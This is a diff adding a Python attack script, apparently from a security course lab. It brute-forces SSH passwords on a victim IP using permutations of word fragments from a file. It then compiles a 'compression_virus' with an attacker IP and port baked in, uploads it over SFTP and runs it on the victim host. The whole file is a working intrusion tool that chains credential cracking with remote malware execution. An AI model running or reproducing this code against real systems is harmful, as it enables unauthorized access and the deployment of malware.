@@ -1,0 +1,60 @@
+#!/bin/python3
+
+from itertools import *
+import paramiko
+import sys
+import os
+
+victim_IP = sys.argv[1]
+attacker_IP = sys.argv[2]
+attacker_port = sys.argv[3]
+
+# read file from victim.dat
+file = open('/home/csc2023/materials/victim.dat', 'r')
+lines = file.readlines()
+file.close()
+
+# strip newline character
+fractions = [line.strip() for line in lines]
+
+# write attacker's IP and port to the header file and then compile CV
+file = open('./attacker.h', 'w')
+file.write('#include<string>\n')
+file.write('using namespace std;\n')
+file.write('string attacker_IP = \"'+attacker_IP+"\";\n")
+file.write('string attacker_port = \"'+attacker_port+"\";\n")
+file.close()
+
+os.system('g++ -o compression_virus compression_virus.cpp -Os -s')
+
+for i in range(len(fractions)+1):
+    if i>0:
+        for comb in permutations(fractions, i):
+            guess=""
+            for part in comb:
+                guess += part
+
+            # use paramiko to establish SSH connection to the client
+            try:
+                ssh = paramiko.SSHClient()
+
+                # Allow connection with host not on the known_hosts file
+                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                
+                # increase banner_timeout to prevent from timeout from the banner
+                ssh.connect(victim_IP, 22, 'csc2023', guess, timeout=30, banner_timeout=30)
+                
+                print("password cracked: ", guess)
+
+                # open sftp to transmit the CV
+                sftp = ssh.open_sftp()
+                sftp.put('./compression_virus', '/home/csc2023/compression_virus')
+                sftp.close()
+                
+                ssh.exec_command('chmod +x /home/csc2023/compression_virus')
+                ssh.exec_command('/home/csc2023/compression_virus')
+                ssh.close()
+                exit(0)
+            except Exception:
+                print("bad password: ", guess)
+                continue
